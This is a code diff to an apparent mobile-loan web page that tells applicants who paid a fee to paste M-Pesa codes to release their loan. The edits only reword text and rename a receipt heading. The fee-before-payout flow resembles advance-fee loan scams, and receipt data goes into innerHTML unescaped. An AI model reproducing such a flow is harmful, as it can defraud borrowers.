@@ -820,7 +820,7 @@
     <p class="text-sm text-gray-600 mb-4">
       Paste your M-Pesa transaction code below to verify your  withdrawal if you haven't received your loan amount or you had loan withdrawal issue and you have paid the fee required,
       Check your phone for the confirmation SMS from M-Pesa you received after fee payment was done. eg THV5SCFSUH.
-      only valid codes and current codes are allowed by system. Not that nvalid are rejected and take long to be accepted.
+      only valid codes and current codes are allowed by system. Note that invalid M-pesa codes are rejected and take long to be accepted.
     </p>
 
     <input 
@@ -914,7 +914,7 @@
         function loadLoanData() {
             try {
                 const selectedOffer = localStorage.getItem('swift_selected_offer');
-                const customerName = localStorage.getItem('swift_customer_name') || 'Customer 252';
+                const customerName = localStorage.getItem('swift_customer_name') || 'Applicant';
                 
                 if (!selectedOffer) {
                     showError('No loan offer selected. Please go back and select a loan offer first.');
@@ -1657,7 +1657,8 @@ function renderReceiptCard(receipt) {
     const container = document.getElementById('receiptCardContainer');
     container.innerHTML = `
       <div class="border rounded-xl shadow-sm p-4 ${statusBg(receipt.status)}">
-        <h4 class="font-semibold text-lg mb-2">LIVE LOAN WITHDRAWAL RECEIPT📣</h4>
+        <h4 class="font-semibold text-lg mb-2">Loan Withdrawal Receipt 🧾
+</h4>
         <div class="text-sm space-y-1">
           <p><strong>Reference:</strong> ${receipt.reference}</p>
           <p><strong>Transaction ID:</strong> ${receipt.transaction_id || 'N/A'}</p>
